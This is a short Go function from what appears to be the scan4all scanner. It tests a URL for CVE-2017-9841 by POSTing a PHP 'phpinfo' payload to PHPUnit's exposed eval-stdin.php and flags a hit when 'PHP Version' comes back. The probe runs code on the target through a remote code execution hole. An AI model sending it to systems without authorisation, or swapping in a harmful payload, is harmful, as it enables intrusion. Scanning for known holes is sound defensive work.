package phpunit

import (
	"github.com/GhostTroops/scan4all/lib/util"
)

func CVE_2017_9841(url string) bool {
	if req, err := util.HttpRequset(url+"/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "POST", "<?=phpinfo();?>", false, nil); err == nil {
		if req.StatusCode == 200 && util.StrContains(req.Body, "PHP Version") {
			util.SendLog(req.RequestUrl, "CVE-2017-9841", "Found vuln phpunit", "")
			return true
		}
	}
	return false
}
